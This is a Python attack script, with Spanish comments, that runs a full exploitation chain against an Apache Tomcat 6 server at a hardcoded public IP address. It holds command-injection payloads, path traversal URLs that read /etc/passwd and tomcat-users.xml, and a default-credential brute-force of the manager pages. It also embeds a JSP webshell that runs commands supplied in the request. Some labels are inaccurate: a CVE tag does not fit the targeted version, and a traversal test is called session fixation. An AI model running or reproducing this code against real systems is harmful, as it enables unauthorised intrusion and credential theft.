import requests
import urllib3
import base64
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Tomcat6Exploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def exploit_request_param_example(self):
        """Explota RequestParamExample para ejecución de comandos"""
        print("[*] Explotando RequestParamExample...")
        
        # Esta servlet puede ser vulnerable a command injection
        url = f"{self.base_url}/examples/servlets/servlet/RequestParamExample"
        
        # Payloads de prueba
        payloads = [
            "'; ls -la; #",
            "| dir",
            "`whoami`",
            "../",
            "../../"
        ]
        
        for payload in payloads:
            try:
                data = {"param1": payload, "param2": "test"}
                response = self.session.post(url, data=data, timeout=5)
                if "root" in response.text or "administrator" in response.text:
                    print(f"[!] Posible command injection: {payload}")
            except Exception as e:
                print(f"[-] Error: {e}")

    def upload_jsp_shell(self):
        """Intenta subir una webshell JSP usando vulnerabilidades conocidas de Tomcat 6"""
        print("[*] Intentando upload de webshell JSP...")
        
        # Webshell más avanzada para Tomcat 6
        jsp_shell = """<%@ page import="java.util.*,java.io.*,java.net.*"%>
<%
class StreamConnector extends Thread {
    InputStream is; OutputStream os;
    StreamConnector(InputStream is, OutputStream os) {
        this.is = is; this.os = os;
    }
    public void run() {
        BufferedReader in = null; BufferedWriter out = null;
        try {
            in = new BufferedReader(new InputStreamReader(this.is));
            out = new BufferedWriter(new OutputStreamWriter(this.os));
            char buffer[] = new char[8192]; int length;
            while((length = in.read(buffer, 0, buffer.length)) > 0) {
                out.write(buffer, 0, length); out.flush();
            }
        } catch(Exception e) {}
        try {
            if(in != null) in.close();
            if(out != null) out.close();
        } catch(Exception e) {}
    }
}
try {
    String shell = request.getParameter("shell");
    if(shell != null) {
        Process p = Runtime.getRuntime().exec(shell);
        new StreamConnector(p.getInputStream(), response.getOutputStream()).start();
        new StreamConnector(p.getErrorStream(), response.getOutputStream()).start();
        new StreamConnector(request.getInputStream(), p.getOutputStream()).start();
    }
} catch(Exception e) {}
%>"""
        
        # Intentar upload mediante diferentes métodos
        upload_urls = [
            f"{self.base_url}/examples/jsp/jsp2/el/",
            f"{self.base_url}/examples/servlets/",
            f"{self.base_url}/examples/jsp/security/",
            f"{self.base_url}/examples/jsp/error/",
            f"{self.base_url}/examples/jsp/include/"
        ]
        
        for upload_url in upload_urls:
            try:
                # Verificar si el directorio permite escritura
                response = self.session.get(upload_url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Directorio accesible: {upload_url}")
            except:
                pass

    def exploit_session_example(self):
        """Explota SessionExample para manipulación de sesiones"""
        print("[*] Explotando SessionExample...")
        
        url = f"{self.base_url}/examples/servlets/servlet/SessionExample"
        
        try:
            # Obtener sesión
            response = self.session.get(url)
            
            # Manipular cookies de sesión
            if 'JSESSIONID' in self.session.cookies:
                print(f"[+] Sesión obtenida: {self.session.cookies['JSESSIONID']}")
                
                # Intentar fijación de sesión
                malicious_session = "../../../etc/passwd"
                self.session.cookies['JSESSIONID'] = malicious_session
                
                response2 = self.session.get(url)
                if "root:" in response2.text:
                    print("[!] ¡Vulnerable a session fixation!")
                    
        except Exception as e:
            print(f"[-] Error en SessionExample: {e}")

    def tomcat_6_specific_exploits(self):
        """Exploits específicos para Tomcat 6.0.53"""
        print("[*] Ejecutando exploits específicos para Tomcat 6.0.53...")
        
        # CVE-2009-3548 - Tomcat 6.0.20 and earlier
        exploits = [
            "/examples/jsp/cal/cal2.jsp?time=..\\..\\..\\..\\..\\windows\\win.ini",
            "/examples/jsp/num/numguess.jsp?../web.xml",
            "/examples/servlets/servlet/HelloWorldExample/../../../../conf/tomcat-users.xml",
            "/examples/jsp/include/include.jsp?file=../../../../etc/passwd"
        ]
        
        for exploit in exploits:
            try:
                url = f"{self.base_url}{exploit}"
                response = self.session.get(url, timeout=5)
                
                if "root:" in response.text or "[extensions]" in response.text or "tomcat-users" in response.text:
                    print(f"[!] ¡VULNERABLE! {exploit}")
                    # Guardar resultado
                    with open(f"exploit_result_{exploit.split('/')[-1]}.txt", "w") as f:
                        f.write(response.text)
                    print(f"[+] Resultado guardado en exploit_result_{exploit.split('/')[-1]}.txt")
                    
            except Exception as e:
                print(f"[-] Error en {exploit}: {e}")

    def brute_force_with_common_tomcat6_creds(self):
        """Fuerza bruta con credenciales específicas de Tomcat 6"""
        print("[*] Probando credenciales específicas de Tomcat 6...")
        
        # Credenciales comunes en Tomcat 6
        tomcat6_creds = [
            ("admin", "tomcat6"), ("tomcat", "tomcat6"),
            ("admin", "tomcat6.0"), ("tomcat", "tomcat6.0"),
            ("admin", "6.0.53"), ("tomcat", "6.0.53"),
            ("qwerty", "qwerty"), ("tomcat6", "tomcat6"),
            ("admin", "tomcat!"), ("tomcat", "admin!"),
            ("manager", "manager"), ("admin", "manager"),
            ("tomcat", "manager"), ("both", "tomcat"),
            ("role1", "role1"), ("role", "role"),
            ("j2deployer", "j2deployer"), ("ovwebusr", "OvW*busr1"),
            ("cxsdk", "kdsxc"), ("ADMIN", "ADMIN"),
            ("xampp", "xampp"), ("admin", "xampp")
        ]
        
        targets = [
            f"{self.base_url}/manager/html",
            f"{self.base_url}/host-manager/html",
            f"{self.base_url}/manager/status",
            f"{self.base_url}/manager/jmxproxy"
        ]
        
        for target in targets:
            for username, password in tomcat6_creds:
                try:
                    response = requests.get(target, auth=(username, password), verify=False, timeout=5)
                    if response.status_code == 200 and "Tomcat" in response.text:
                        print(f"[!] ¡CREDENCIALES VÁLIDAS ENCONTRADAS!")
                        print(f"    URL: {target}")
                        print(f"    Usuario: {username}")
                        print(f"    Contraseña: {password}")
                        return username, password, target
                except:
                    pass
        
        print("[-] No se encontraron credenciales válidas")
        return None, None, None

    def run_complete_exploitation(self):
        """Ejecuta la explotación completa"""
        print("=== EXPLOTACIÓN COMPLETA TOMCAT 6.0.53 ===\n")
        
        # 1. Exploits específicos
        self.tomcat_6_specific_exploits()
        print()
        
        # 2. Explotar servlets
        self.exploit_request_param_example()
        print()
        
        self.exploit_session_example()
        print()
        
        # 3. Fuerza bruta mejorada
        self.brute_force_with_common_tomcat6_creds()
        print()
        
        # 4. Intentar upload
        self.upload_jsp_shell()

# Ejecutar
exploiter = Tomcat6Exploiter("189.254.143.102")
exploiter.run_complete_exploitation()